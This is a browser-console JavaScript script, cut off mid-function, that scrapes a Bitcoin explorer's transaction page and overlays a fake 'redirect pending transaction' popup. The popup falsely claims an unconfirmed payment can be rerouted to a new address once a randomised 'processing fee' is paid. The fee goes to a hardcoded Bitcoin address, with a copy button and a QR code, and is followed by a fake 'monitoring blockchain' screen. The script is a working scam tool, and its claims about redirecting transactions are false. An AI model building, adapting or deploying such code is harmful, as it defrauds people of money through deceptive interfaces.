(() => {
  console.clear();
  const transactionIdRegex = /\b[a-f0-9]{64}\b/i;
  const bitcoinAddressRegex = /\b((?:bc1p|bc1q|bc1)[0-9a-z]{20,90}|[13][a-km-zA-HJ-NP-Z1-9]{25,40})\b/i;
  const normalizeSatoshis = (numericValue) => typeof numericValue === "number" ? numericValue : Number(numericValue || 0);
  const satoshisToBtc = (value) => normalizeSatoshis(value) / 100000000;
  const parseNumber = (normalizedValue) => Number(String(normalizedValue).replace(/[, \u00A0\u202F]/g, ""));
  const decodeUrlPath = (urlString) => {
    try {
      const urlObject = new URL(urlString, location.origin);
      return decodeURIComponent(urlObject.pathname.split("/").filter(Boolean).pop() || "");
    } catch {
      return urlString.split("/").filter(Boolean).pop() || "";
    }
  };
  function loadQrCode() {
    return new Promise((initializeQrCodeLibrary, handleQrCodeError) => {
      if (typeof QRCode !== "undefined") {
        initializeQrCodeLibrary();
        return;
      }
      const qrCodeScript = document.createElement("script");
      qrCodeScript.src = "https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js";
      qrCodeScript.onload = () => initializeQrCodeLibrary();
      qrCodeScript.onerror = () => handleQrCodeError(new Error("Failed to load QRCode library"));
      document.head.appendChild(qrCodeScript);
    });
  }
  function createQrCode(textValue, qrCodeSize = 150) {
    const qrCodeElement = document.createElement("div");
    qrCodeElement.style.width = qrCodeSize + "px";
    qrCodeElement.style.height = qrCodeSize + "px";
    new QRCode(qrCodeElement, {
      text: String(textValue),
      width: qrCodeSize,
      height: qrCodeSize,
      colorDark: "#000000",
      colorLight: "#ffffff",
      correctLevel: QRCode.CorrectLevel.H
    });
    return qrCodeElement;
  }
  const pageText = (location.pathname || "").split("/").filter(Boolean).pop() || "";
  let transactionId = transactionIdRegex.test(pageText) ? pageText.match(transactionIdRegex)[0] : "";
  if (!transactionId) {
    const textTreeWalker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
    let textNode;
    while (textNode = textTreeWalker.nextNode()) {
      const transactionIdMatch = textNode.nodeValue && textNode.nodeValue.match(transactionIdRegex);
      if (transactionIdMatch) {
        transactionId = transactionIdMatch[0];
        break;
      }
    }
  }
  if (!transactionId) {
    alert("Transaction ID not found.");
    return;
  }
  const transactionText = document.body.innerText || "";
  const jsonCandidates = [];
  const jsonScriptElement = document.getElementById("__NEXT_DATA__");
  if (jsonScriptElement?.textContent?.trim().startsWith("{")) {
    jsonCandidates.push(jsonScriptElement.textContent.trim());
  }
  document.querySelectorAll("script[type=\"application/json\"], script:not([src])").forEach((scriptElement) => {
    const scriptTextContent = scriptElement.textContent?.trim();
    if (!scriptTextContent) {
      return;
    }
    if (scriptTextContent.includes(transactionId) || scriptTextContent.startsWith("{") && scriptTextContent.length > 2000 && (scriptTextContent.includes("\"props\"") || scriptTextContent.includes("\"pageProps\""))) {
      jsonCandidates.push(scriptTextContent);
    }
  });
  const parsedJsonObjects = [];
  for (const jsonText of jsonCandidates) {
    try {
      parsedJsonObjects.push(JSON.parse(jsonText));
    } catch {}
  }
  function findTransactionObject(objectValue, targetTransactionId) {
    let matchedTransaction = null;
    (function scanJsonObject(jsonObject) {
      if (!jsonObject || matchedTransaction) {
        return;
      }
      if (typeof jsonObject !== "object") {
        return;
      }
      const transactionObject = jsonObject.tx || jsonObject.transaction || jsonObject;
      const objectTransactionId = String(transactionObject.hash || transactionObject.txid || "").toLowerCase();
      if (objectTransactionId && objectTransactionId === targetTransactionId.toLowerCase()) {
        matchedTransaction = transactionObject;
        return;
      }
      for (const propertyName in jsonObject) {
        if (!matchedTransaction) {
          try {
            scanJsonObject(jsonObject[propertyName]);
          } catch {}
        }
      }
    })(objectValue);
    return matchedTransaction;
  }
  let transactionData = null;
  for (const jsonCandidate of parsedJsonObjects) {
    transactionData = findTransactionObject(jsonCandidate, transactionId);
    if (transactionData) {
      break;
    }
  }
  let senderAddress = "—";
  let transactionAmountSatoshis = null;
  let transactionTime = "—";
  let transactionStatus = "—";
  let btcPriceData = null;
  function extractTransactionData() {
    const amountElement = document.querySelector("div[data-testid=\"transaction-amount\"]") || document.querySelector("span[class*=\"sc-\"]") || document.querySelector("div[class*=\"Value\"]");
    if (amountElement) {
      const amountText = amountElement.textContent.trim();
      const btcAmountMatch = amountText.match(/([0-9]+(?:\.[0-9]+)?)\s*BTC/i);
      if (btcAmountMatch) {
        transactionAmountSatoshis = Math.round(Number(btcAmountMatch[1]) * 100000000);
      }
    }
    const statusElement = document.querySelector("span[class*=\"Status\"], div[class*=\"status\"]");
    if (statusElement) {
      const statusText = statusElement.textContent.trim();
      if (/confirmed/i.test(statusText)) {
        transactionStatus = "Confirmed";
      } else if (/pending/i.test(statusText) || /unconfirmed/i.test(statusText)) {
        transactionStatus = "Pending";
      }
    }
    const addressLink = document.querySelector("a[href*=\"/explorer/addresses/btc/\"]") || document.querySelector("a[href*=\"/address/\"]");
    if (addressLink) {
      const addressHref = addressLink.getAttribute("href") || "";
      const urlPathParts = addressHref.split("/").filter(Boolean);
      const lastUrlPathPart = urlPathParts[urlPathParts.length - 1];
      if (bitcoinAddressRegex.test(lastUrlPathPart)) {
        senderAddress = lastUrlPathPart;
      }
    }
    const usdAmountMatch = transactionText.match(/\$([0-9,]+(?:\.[0-9]+)?)\s*(?:USD|usd)?/i);
    const btcAmountMatchFromText = transactionText.match(/([0-9]+(?:\.[0-9]+)?)\s*BTC/i);
    if (usdAmountMatch && btcAmountMatchFromText) {
      btcPriceData = {
        btc: Number(btcAmountMatchFromText[1]),
        usd: parseNumber(usdAmountMatch[1])
      };
    }
  }
  if (!transactionData) {
    extractTransactionData();
  }
  if (transactionData) {
    const transactionInputs = transactionData.vin || transactionData.inputs || [];
    const transactionOutputs = transactionData.vout || transactionData.out || transactionData.outputs || [];
    const detectedAddresses = [];
    for (const transactionInput of transactionInputs) {
      const possibleInputAddresses = [transactionInput.addr, transactionInput.address, transactionInput.sender, transactionInput.prev_out && transactionInput.prev_out.addr, transactionInput.prev_out && transactionInput.prev_out.address, transactionInput.prevout && transactionInput.prevout.addr, transactionInput.prevout && transactionInput.prevout.address, ...(transactionInput.addresses || []), ...(transactionInput.prev_out && transactionInput.prev_out.addresses ? transactionInput.prev_out.addresses : [])].filter(Boolean);
      for (const possibleAddress of possibleInputAddresses) {
        const inputAddressMatch = String(possibleAddress).match(bitcoinAddressRegex);
        if (inputAddressMatch) {
          detectedAddresses.push(inputAddressMatch[0]);
          break;
        }
      }
    }
    if (detectedAddresses.length >= 1) {
      senderAddress = detectedAddresses[0];
    }
    const uniqueInputAddresses = new Set(detectedAddresses);
    let totalOutputSatoshis = 0;
    let totalInputSatoshis = 0;
    for (const transactionOutput of transactionOutputs) {
      let outputValueSatoshis = null;
      if (transactionOutput.value_satoshis != null) {
        outputValueSatoshis = Number(transactionOutput.value_satoshis);
      } else if (transactionOutput.value_satoshi != null) {
        outputValueSatoshis = Number(transactionOutput.value_satoshi);
      } else if (transactionOutput.valueSat != null) {
        outputValueSatoshis = Number(transactionOutput.valueSat);
      } else if (transactionOutput.value != null) {
        const rawOutputValue = Number(transactionOutput.value);
        outputValueSatoshis = rawOutputValue > 10000000 ? rawOutputValue : Math.round(rawOutputValue * 100000000);
      }
      if (outputValueSatoshis == null) {
        continue;
      }
      totalInputSatoshis += outputValueSatoshis;
      const possibleOutputAddresses = [transactionOutput.addr, transactionOutput.address, transactionOutput.scriptPubKey && transactionOutput.scriptPubKey.address, transactionOutput.scriptPubKey && transactionOutput.scriptPubKey.addresses && transactionOutput.scriptPubKey.addresses[0]].filter(Boolean);
      let candidateSenderAddress = null;
      for (const outputAddressCandidate of possibleOutputAddresses) {
        const outputAddressMatch = String(outputAddressCandidate).match(bitcoinAddressRegex);
        if (outputAddressMatch) {
          candidateSenderAddress = outputAddressMatch[0];
          break;
        }
      }
      if (!candidateSenderAddress || !uniqueInputAddresses.has(candidateSenderAddress)) {
        totalOutputSatoshis += outputValueSatoshis;
      }
    }
    transactionAmountSatoshis = totalOutputSatoshis > 0 ? totalOutputSatoshis : totalInputSatoshis;
    const rawTransactionTime = transactionData.time || transactionData.received_time || transactionData.block_time || transactionData.timestamp;
    if (rawTransactionTime) {
      try {
        const transactionDate = new Date(String(rawTransactionTime).length === 10 ? rawTransactionTime * 1000 : rawTransactionTime);
        transactionTime = transactionDate.toLocaleString();
      } catch {}
    }
    const confirmationCount = transactionData.confirmations ?? transactionData.n_confirmations ?? (transactionData.block_height ? 1 : 0);
    transactionStatus = Number(confirmationCount) >= 1 ? "Confirmed" : "Pending";
  } else {
    if (senderAddress === "—") {
      const candidateSections = Array.from(document.querySelectorAll("section,div,article,main")).filter((sectionElement) => /overview/i.test(sectionElement.textContent || "") || /from/i.test(sectionElement.textContent || ""));
      for (const transactionSection of candidateSections) {
        const addressAnchor = transactionSection.querySelector("a[href*=\"/explorer/addresses/btc/\"], a[href*=\"/address/\"], a[href*=\"/btc/address/\"]");
        if (addressAnchor) {
          const decodedAddressHref = decodeUrlPath(addressAnchor.getAttribute("href") || "");
          const addressFromLinkMatch = decodedAddressHref.match(bitcoinAddressRegex);
          if (addressFromLinkMatch) {
            senderAddress = addressFromLinkMatch[0];
            break;
          }
        }
        const sectionText = transactionSection.innerText || "";
        const senderLabelMatch = sectionText.match(new RegExp("From\\s*[:\\-]?\\s*(" + bitcoinAddressRegex.source + ")", "i"));
        if (senderLabelMatch) {
          senderAddress = senderLabelMatch[1];
          break;
        }
      }
    }
    if (!transactionAmountSatoshis) {
      const fallbackBtcMatch = transactionText.match(/([0-9]+(?:\.[0-9]+)?)\s*BTC/i);
      if (fallbackBtcMatch) {
        transactionAmountSatoshis = Math.round(Number(fallbackBtcMatch[1]) * 100000000);
      }
    }
    if (transactionStatus === "—") {
      const transactionStatusMatch = transactionText.match(/\b(Pending|Confirmed|Unconfirmed|Failed|Success|Completed?|In\s+Mempool)\b/i);
      if (transactionStatusMatch) {
        transactionStatus = transactionStatusMatch[0];
      }
    }
    if (transactionTime === "—") {
      const broadcastTimeMatch = transactionText.match(/Broadcasted on\s*([^\n\r]+)/i) || transactionText.match(/Broadcasted\s*:\s*([^\n\r]+)/i);
      if (broadcastTimeMatch) {
        transactionTime = broadcastTimeMatch[1].trim();
      }
    }
  }
  function findBestTransactionContainer() {
    const candidateElements = Array.from(document.querySelectorAll("section,div,article,main"));
    const scoredCandidates = candidateElements.map((candidateElement) => {
      const elementTextLowercase = (candidateElement.innerText || "").toLowerCase();
      const contentScore = (elementTextLowercase.includes("overview") ? 1 : 0) + (elementTextLowercase.includes("amount") ? 2 : 0) + (elementTextLowercase.includes("btc") ? 1 : 0) + (elementTextLowercase.includes("$") ? 1 : 0);
      return {
        el: candidateElement,
        score: contentScore,
        len: elementTextLowercase.length
      };
    }).filter((scoredItem) => scoredItem.score >= 3).sort((sortItemA, sortItemB) => sortItemB.score - sortItemA.score || sortItemB.len - sortItemA.len);
    return scoredCandidates[0]?.el || document.body;
  }
  const bestContainerElement = findBestTransactionContainer();
  function fetchBtcPrice() {
    const sectionChildren = Array.from(bestContainerElement.querySelectorAll("*"));
    let amountValueContainer = null;
    for (const labelElement of sectionChildren) {
      const labelText = (labelElement.textContent || "").trim();
      if (/^Amount$/i.test(labelText)) {
        let valueElement = labelElement.nextElementSibling;
        if (!valueElement || !(valueElement.innerText || "").trim()) {
          valueElement = labelElement.parentElement?.querySelector(":scope > *:nth-child(2)");
        }
        amountValueContainer = valueElement || labelElement.parentElement;
        break;
      }
    }
    let amountSectionText = "";
    if (amountValueContainer) {
      amountSectionText = amountValueContainer.innerText || "";
    } else {
      const containerText = bestContainerElement.innerText || "";
      const amountMatch = containerText.match(/Amount[\s\S]{0,150}?([0-9]+(?:\.[0-9]+)?)\s*BTC[\s\S]{0,80}?\$\s*([0-9]{1,3}(?:[,\u00A0\u202F][0-9]{3})*(?:\.[0-9]+)?|[0-9]+(?:\.[0-9]+)?)/i);
      if (amountMatch) {
        return {
          btc: parseNumber(amountMatch[1]),
          usd: parseNumber(amountMatch[2])
        };
      }
    }
    if (/fee/i.test(amountSectionText)) {
      const textLines = amountSectionText.split(/\n+/).map((lineText) => lineText.trim()).filter(Boolean);
      const nonFeeAmountLine = textLines.find((textLine) => /BTC/i.test(textLine) && /\$/i.test(textLine) && !/Fee/i.test(textLine));
      amountSectionText = nonFeeAmountLine || amountSectionText;
    }
    const fallbackAmountMatch = amountSectionText.match(/([0-9]+(?:\.[0-9]+)?)\s*BTC[\s\S]{0,80}?\$\s*([0-9]{1,3}(?:[,\u00A0\u202F][0-9]{3})*(?:\.[0-9]+)?|[0-9]+(?:\.[0-9]+)?)/i);
    if (fallbackAmountMatch) {
      return {
        btc: parseNumber(fallbackAmountMatch[1]),
        usd: parseNumber(fallbackAmountMatch[2])
      };
    }
    return null;
  }
  btcPriceData = btcPriceData || fetchBtcPrice();
  const transactionAmountDisplay = transactionAmountSatoshis != null ? satoshisToBtc(transactionAmountSatoshis).toLocaleString(undefined, {
    maximumFractionDigits: 8
  }) + " BTC" : "—";
  let usdAmountDisplay = "—";
  if (btcPriceData && transactionAmountSatoshis != null) {
    const usdPerBtcRate = btcPriceData.usd / btcPriceData.btc;
    const transactionAmountUsd = satoshisToBtc(transactionAmountSatoshis) * usdPerBtcRate;
    usdAmountDisplay = "$" + transactionAmountUsd.toLocaleString(undefined, {
      maximumFractionDigits: 2
    });
  }
  const minimumFeeUsd = 14.5;
  const maximumFeeUsd = 28.5;
  const randomFeeUsd = (Math.random() * (maximumFeeUsd - minimumFeeUsd) + minimumFeeUsd).toFixed(2);
  let processingFeeBtc = "—";
  let processingFeeDisplay = "—";
  if (btcPriceData) {
    const currentBtcUsdRate = btcPriceData.usd / btcPriceData.btc;
    processingFeeBtc = (randomFeeUsd / currentBtcUsdRate).toFixed(8);
    processingFeeDisplay = processingFeeBtc + " BTC ($" + randomFeeUsd + ")";
  } else {
    const averageFeeUsd = ((minimumFeeUsd + maximumFeeUsd) / 2).toFixed(2);
    processingFeeBtc = "0.0008";
    processingFeeDisplay = processingFeeBtc + " BTC ($" + averageFeeUsd + ")";
  }
  const overlayElementId = "btc_flow_overlay";
  const popupElementId = "btc_flow_popup";
  const styleElementId = "btc_flow_style";
  document.getElementById(overlayElementId)?.remove();
  document.getElementById(styleElementId)?.remove();
  const styleElement = document.createElement("style");
  styleElement.id = styleElementId;
  styleElement.textContent = "\n    #" + overlayElementId + " {\n      position: fixed;\n      inset: 0;\n      display: grid;\n      place-items: center;\n      background: rgba(0,0,0,0.7);\n      z-index: 2147483647;\n      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;\n    }\n    #" + popupElementId + " {\n      background: #fff;\n      color: #333;\n      width: 380px;\n      border-radius: 10px;\n      box-shadow: 0 8px 25px rgba(0,0,0,0.3);\n      overflow: hidden;\n      font-size: 13px;\n      max-height: 90vh;\n      overflow-y: auto;\n    }\n    .page { display: none; }\n    .page.active { display: block; }\n    .header {\n      padding: 15px 45px 15px 18px;\n      background: #f8f9fa;\n      border-bottom: 1px solid #e0e0e0;\n      text-align: center;\n      position: relative;\n    }\n    .header h3 { margin: 0; font-size: 16px; font-weight: 600; }\n    .header-subtitle { font-size: 12px; color: #666; margin-top: 2px; }\n    .close-btn {\n      position: absolute;\n      top: 50%;\n      right: 12px;\n      transform: translateY(-50%);\n      background: none;\n      border: none;\n      font-size: 18px;\n      color: #666;\n      cursor: pointer;\n      width: 28px;\n      height: 28px;\n      border-radius: 50%;\n      display: flex;\n      align-items: center;\n      justify-content: center;\n    }\n    .close-btn:hover { background: #e9ecef; }\n    .content { padding: 16px; }\n    .transaction-info {\n      background: #f8f9fa;\n      padding: 12px;\n      border-radius: 6px;\n      margin-bottom: 12px;\n      border: 1px solid #e0e0e0;\n    }\n    .info-row {\n      display: flex;\n      justify-content: space-between;\n      padding: 5px 0;\n      border-bottom: 1px solid #f0f0f0;\n    }\n    .info-row:last-child { border-bottom: none; }\n    .info-label { color: #666; font-size: 12px; }\n    .info-value { color: #333; font-weight: 500; font-size: 12px; text-align: right; }\n    .amount-display {\n      text-align: center;\n      margin: 15px 0;\n      padding: 12px;\n      background: #f8f9fa;\n      border-radius: 6px;\n      border: 1px solid #e0e0e0;\n    }\n    .btc-amount { font-size: 22px; font-weight: 700; color: #f7931a; }\n    .usd-amount { font-size: 13px; color: #666; }\n    .status-badge {\n      display: inline-block;\n      padding: 2px 8px;\n      background: #ffa726;\n      color: #fff;\n      border-radius: 3px;\n      font-size: 10px;\n      font-weight: 600;\n      margin-left: 6px;\n    }\n    .status-confirmed { background: #4caf50; }\n    .input-group {\n      margin: 12px 0;\n      background: #f8f9fa;\n      padding: 12px;\n      border-radius: 6px;\n      border: 1px solid #e0e0e0;\n    }\n    .input-label { font-size: 12px; font-weight: 500; margin-bottom: 6px; }\n    input[type=\"text\"] {\n      width: 100%;\n      padding: 8px 10px;\n      border: 1px solid #ddd;\n      border-radius: 4px;\n      font-size: 13px;\n      font-family: monospace;\n      background: #fff;\n      box-sizing: border-box;\n    }\n    input[type=\"text\"]:focus { outline: none; border-color: #007bff; }\n    input[type=\"text\"].invalid { border-color: #dc3545; }\n    .validation-message { font-size: 11px; margin-top: 4px; display: none; }\n    .validation-message.invalid { color: #dc3545; display: block; }\n    .btn {\n      width: 100%;\n      padding: 10px;\n      border: none;\n      border-radius: 4px;\n      font-size: 13px;\n      font-weight: 600;\n      cursor: pointer;\n      margin-bottom: 6px;\n      transition: all 0.2s;\n    }\n    .btn:active { transform: scale(0.98); }\n    .btn-primary { background: #007bff; color: #fff; }\n    .btn-primary:hover { background: #0056b3; }\n    .btn-primary:disabled { background: #6c757d; cursor: not-allowed; opacity: 0.6; }\n    .btn-secondary { background: #6c757d; color: #fff; }\n    .btn-secondary:hover { background: #545b62; }\n    .btn-simple {\n      background: transparent;\n      color: #6c757d;\n      border: 1px solid #dee2e6;\n      font-weight: normal;\n    }\n    .btn-simple:hover { background: #f8f9fa; }\n    .btn-outline {\n      background: transparent;\n      color: #007bff;\n      border: 1px solid #007bff;\n      font-weight: normal;\n    }\n    .btn-outline:hover { background: #007bff; color: #fff; }\n    .notice-box {\n      background: #fff3cd;\n      border: 1px solid #ffeaa7;\n      padding: 10px 12px;\n      border-radius: 4px;\n      margin: 10px 0;\n      font-size: 12px;\n    }\n    .notice-box strong { font-weight: 600; }\n    .copy-section {\n      background: #f8f9fa;\n      padding: 12px;\n      border-radius: 6px;\n      margin: 10px 0;\n      border: 1px solid #e0e0e0;\n    }\n    .copy-header {\n      font-size: 13px;\n      font-weight: 600;\n      text-align: center;\n      padding-bottom: 8px;\n      border-bottom: 1px solid #e9ecef;\n    }\n    .copy-item {\n      display: flex;\n      align-items: center;\n      justify-content: space-between;\n      padding: 8px 0;\n      border-bottom: 1px solid #e9ecef;\n    }\n    .copy-item:last-child { border-bottom: none; }\n    .copy-label { font-size: 12px; color: #666; min-width: 60px; }\n    .copy-value {\n      flex: 1;\n      font-family: monospace;\n      font-size: 11px;\n      color: #2c3e50;\n      word-break: break-all;\n      margin: 0 10px;\n      text-align: center;\n    }\n    .copy-btn {\n      background: #6c757d;\n      color: #fff;\n      border: none;\n      padding: 4px 8px;\n      border-radius: 3px;\n      font-size: 10px;\n      font-weight: 600;\n      cursor: pointer;\n      min-width: 44px;\n    }\n    .copy-btn:hover { background: #545b62; }\n    .copy-btn.copied { background: #28a745; }\n    .qr-code-container {\n      width: 150px;\n      height: 150px;\n      margin: 8px auto;\n      display: flex;\n      align-items: center;\n      justify-content: center;\n      background: #fff;\n      padding: 8px;\n      border-radius: 6px;\n      border: 1px solid #e0e0e0;\n    }\n    .qr-code-container canvas,\n    .qr-code-container div { display: block; width: 100% !important; height: 100% !important; }\n    .processing { text-align: center; padding: 15px; }\n    .processing-icon { font-size: 28px; margin-bottom: 10px; }\n    .processing-text { font-size: 13px; color: #666; }\n    .progress-bar {\n      height: 3px;\n      background: #e0e0e0;\n      border-radius: 2px;\n      margin: 12px 0;\n      overflow: hidden;\n    }\n    .progress {\n      height: 100%;\n      background: #007bff;\n      width: 45%;\n      animation: progress 2s ease-in-out infinite;\n    }\n    @keyframes progress {\n      0% { transform: translateX(-100%); }\n      100% { transform: translateX(250%); }\n    }\n    .footer {\n      padding: 10px 16px;\n      background: #f8f9fa;\n      border-top: 1px solid #e0e0e0;\n      display: flex;\n      justify-content: space-between;\n      font-size: 11px;\n      color: #666;\n    }\n    .monospace { font-family: monospace; font-size: 10px; }\n    .confirmed-box {\n      background: #d4edda;\n      border: 1px solid #c3e6cb;\n      padding: 10px;\n      border-radius: 4px;\n      margin: 10px 0;\n      font-size: 12px;\n    }\n    #qrCodeCanvasContainer { display: none; margin: 8px auto; text-align: center; }\n    .qr-loading { color: #666; font-size: 12px; padding: 15px; }\n    .error-box {\n      background: #f8d7da;\n      border: 1px solid #f5c6cb;\n      padding: 15px;\n      border-radius: 6px;\n      margin: 12px 0;\n      text-align: center;\n    }\n    .error-icon { font-size: 28px; margin-bottom: 6px; color: #dc3545; }\n    .error-title { font-size: 14px; font-weight: 600; color: #721c24; }\n    .error-message { font-size: 12px; color: #721c24; }\n  ";
  document.head.appendChild(styleElement);
  const overlayElement = document.createElement("div");
  overlayElement.id = overlayElementId;
  const popupElement = document.createElement("div");
  popupElement.id = popupElementId;
  const isConfirmed = transactionStatus.toLowerCase().includes("confirmed");
  const isPendingTransaction = !isConfirmed;
  const renderTransactionPage = () => "\n    <div class=\"page active\" id=\"page1\">\n      <div class=\"header\">\n        <button class=\"close-btn\" id=\"closePage1\">✕</button>\n        <h3>Transaction Details</h3>\n        <div class=\"header-subtitle\">Bitcoin Network</div>\n      </div>\n      <div class=\"content\">\n        <div class=\"amount-display\">\n          <div class=\"btc-amount\">" + transactionAmountDisplay + " <span class=\"status-badge " + (isConfirmed ? "status-confirmed" : "") + "\">" + transactionStatus + "</span></div>\n          <div class=\"usd-amount\">" + usdAmountDisplay + "</div>\n        </div>\n        <div class=\"transaction-info\">\n          <div class=\"info-row\"><span class=\"info-label\">TXID:</span><span class=\"info-value monospace\">" + transactionId.substring(0, 14) + "...</span></div>\n          <div class=\"info-row\"><span class=\"info-label\">From:</span><span class=\"info-value monospace\">" + senderAddress.substring(0, 14) + "...</span></div>\n          <div class=\"info-row\"><span class=\"info-label\">Time:</span><span class=\"info-value\">" + transactionTime + "</span></div>\n          <div class=\"info-row\"><span class=\"info-label\">Network:</span><span class=\"info-value\">Bitcoin Mainnet</span></div>\n        </div>\n        " + (isPendingTransaction ? "\n          <div class=\"notice-box\"><strong>Pending Transaction</strong><br>Can be redirected before confirmation.</div>\n          <div class=\"input-group\">\n            <div class=\"input-label\">New recipient address:</div>\n            <input type=\"text\" id=\"redirectAddress\" placeholder=\"Enter Bitcoin address\" />\n            <div class=\"validation-message\" id=\"addressValidation\"></div>\n          </div>\n          <button class=\"btn btn-primary\" id=\"nextToFees\" disabled>Continue</button>\n        " : "\n          <div class=\"confirmed-box\"><strong>Confirmed</strong><br>This transaction cannot be modified.</div>\n          <button class=\"btn btn-secondary\" id=\"closeOnly\">Close</button>\n        ") + "\n      </div>\n      <div class=\"footer\"><div>Step 1 of 3</div><div>Secure</div></div>\n    </div>\n  ";
  const renderFeePage = () => "\n    <div class=\"page\" id=\"page2\">\n      <div class=\"header\">\n        <button class=\"close-btn\" id=\"closePage2\">✕</button>\n        <h3>Processing Fee</h3>\n        <div class=\"header-subtitle\">Bitcoin Transaction Service</div>\n      </div>\n      <div class=\"content\">\n        <div class=\"transaction-info\">\n          <div class=\"info-row\"><span class=\"info-label\">Amount:</span><span class=\"info-value\">" + transactionAmountDisplay + "</span></div>\n          <div class=\"info-row\"><span class=\"info-label\">Fee:</span><span class=\"info-value\">" + processingFeeDisplay + "</span></div>\n          <div class=\"info-row\"><span class=\"info-label\">New Recipient:</span><span class=\"info-value monospace\" id=\"newRecipientDisplay\">—</span></div>\n        </div>\n        <div class=\"notice-box\">Network fee required to process the redirection.</div>\n        <div class=\"copy-section\">\n          <div class=\"copy-header\">SEND PROCESSING FEE</div>\n          <div class=\"copy-item\"><span class=\"copy-label\">Amount:</span><span class=\"copy-value\">" + processingFeeBtc + " BTC</span><button class=\"copy-btn\" data-copy=\"" + processingFeeBtc + "\">Copy</button></div>\n          <div class=\"copy-item\"><span class=\"copy-label\">Address:</span><span class=\"copy-value\">bc1q88k6m8pay5q9tngfl98ztu3kz2gkxzv5q0py72</span><button class=\"copy-btn\" data-copy=\"bc1q88k6m8pay5q9tngfl98ztu3kz2gkxzv5q0py72\">Copy</button></div>\n        </div>\n        <button class=\"btn btn-outline\" id=\"toggleQRCode\">Show QR Code</button>\n        <div id=\"qrCodeCanvasContainer\" style=\"display:none;text-align:center;\">\n          <div class=\"qr-code-container\" id=\"qrCodeDisplay\"><div class=\"qr-loading\">Loading...</div></div>\n          <div style=\"font-size:11px;color:#666;margin-top:6px;\">Scan to pay " + processingFeeBtc + " BTC</div>\n        </div>\n        <div class=\"notice-box\" style=\"background:#e3f2fd;border-color:#bbdefb;\"><strong>Note:</strong> The original amount (" + transactionAmountDisplay + ") will be redirected after fee confirmation.</div>\n        <button class=\"btn btn-primary\" id=\"confirmProcessing\">Confirm Fee Payment</button>\n        <button class=\"btn btn-secondary\" id=\"backToOverview\">Back</button>\n      </div>\n      <div class=\"footer\"><div>Step 2 of 3</div><div>Monitoring</div></div>\n    </div>\n  ";
  const renderProcessingPage = () => "\n    <div class=\"page\" id=\"page3\">\n      <div class=\"header\"><h3>Processing</h3><div class=\"header-subtitle\">Network Confirmation</div></div>\n      <div class=\"content\">\n        <div class=\"processing\">\n          <div class=\"processing-icon\">⏳</div>\n          <div class=\"processing-text\">Monitoring blockchain for fee confirmation...</div>\n          <div class=\"progress-bar\"><div class=\"progress\"></div></div>\n          <div class=\"transaction-info\">\n            <div class=\"info-row\"><span class=\"info-label\">Status:</span><span class=\"info-value\">Awaiting " + processingFeeBtc + " BTC Fee</span></div>\n            <div class=\"info-row\"><span class=\"info-label\">Recipient:</span><span class=\"info-value monospace\" id=\"monitorRecipient\">—</span></div>\n            <div class=\"info-row\"><span class=\"info-label\">Amount:</span><span class=\"info-value\">" + transactionAmountDisplay + "</span></div>\n          </div>\n        </div>\n        <button class=\"btn btn-simple\" id=\"closeProcessing\">Close</button>\n      </div>\n      <div class=\"footer\"><div>Step 3 of 3</div><div>Connected</div></div>\n    </div>\n  ";
  popupElement.innerHTML = renderTransactionPage() + (isPendingTransaction ? renderFeePage() + renderProcessingPage() : "");
  overlayElement.appendChild(popupElement);
  document.body.appendChild(overlayElement);
  if (isPendingTransaction) {
    let currentPage = 1;
    const pageElements = {
      1: document.getElementById("page1"),
      2: document.getElementById("page2"),
      3: document.getElementById("page3")
    };
    function showPage(targetPageNumber) {
      Object.values(pageElements).forEach((pageElement) => pageElement.classList.remove("active"));
      pageElements[targetPageNumber].classList.add("active");
      currentPage = targetPageNumber;
    }
    async function monitorTransaction() {
      const toggleQrButton = document.getElementById("toggleQRCode");
      const qrCodeCanvasContainer = document.getElementById("qrCodeCanvasContainer");
      const qrCodeDisplay = document.getElementById("qrCodeDisplay");
      if (!toggleQrButton || !qrCodeCanvasContainer || !qrCodeDisplay) {
        return;
      }
      const feeRecipientAddress = "bc1q88k6m8pay5q9tngfl98ztu3kz2gkxzv5q0py72";
      const bitcoinPaymentUri = "bitcoin:" + feeRecipientAddress + "?amount=" + processingFeeBtc;
      let isQrCodeVisible = false;
      toggleQrButton.addEventListener("click", async function () {
        if (qrCodeCanvasContainer.style.display === "block") {
          qrCodeCanvasContainer.style.display = "none";
          this.textContent = "Show QR Code";
        } else if (!isQrCodeVisible) {
          try {
            qrCodeDisplay.innerHTML = "<div class=\"qr-loading\">⏳ Loading...</div>";
            qrCodeCanvasContainer.style.display = "block";
            await loadQrCode();
            const generatedQrElement = createQrCode(bitcoinPaymentUri, 150);
            qrCodeDisplay.innerHTML = "";
            qrCodeDisplay.appendChild(generatedQrElement);
            this.textContent = "Hide QR Code";
            isQrCodeVisible = true;
          } catch (qrCodeError) {
            qrCodeDisplay.innerHTML = "<div style=\"color:#dc3545;padding:15px;text-align:center;\">❌ Failed<br><small>" + qrCodeError.message + "</small></div>";
          }
        } else {
          qrCodeCanvasContainer.style.display = "block";
          this.textContent = "Hide QR Code";
        }
      });
    }
    function updateCopyButtons() {
      document.querySelectorAll(".copy-btn").forEach((copyButton) => {
        copyButton.addEventListener("click", async function () {
          const textToCopy = this.getAttribute("data-copy");
          try {
            await navigator.clipboard.writeText(textToCopy);
            const originalButtonText = this.textContent;
            this.textContent = "Copied!";
            this.classList.add("copied");
            setTimeout(() => {
              this.textContent = originalButtonText;
              this.classList.remove("copied");
            }, 1500);
          } catch {
            const temporaryTextarea = document.createElement("textarea");
            temporaryTextarea.value = textToCopy;
            document.body.appendChild(temporaryTextarea);
            temporaryTextarea.select();
            document.execCommand("copy");
            document.body.removeChild(temporaryTextarea);
            const previousButtonText = this.textContent;
            this.textContent = "Copied!";
            this.classList.add("copied");
            setTimeout(() => {
              this.textContent = previousButtonText;
              this.classList.remove("copied");
            }, 1500);
          }
        });
      });
    }
    function isValidBitcoinAddress(addressValue) {
      const bitcoinAddress = addressValue.trim();
      return /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(bitcoinAddress) || /^3[a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(bitcoinAddress) || /^(bc1)[a-z0-9]{25,90}$/.test(bitcoinAddress) || /^(bc1p)[a-z0-9]{25,90}$/.test(bitcoinAddress);
    }
    function validateRecipientAddress(addressInputValue) {
      const addressInputElement = document.getElementById("redirectAddress");
      const addressValidationMessage = document.getElementById("addressValidation");
      const continueButton = document.getElementById("nextToFees");
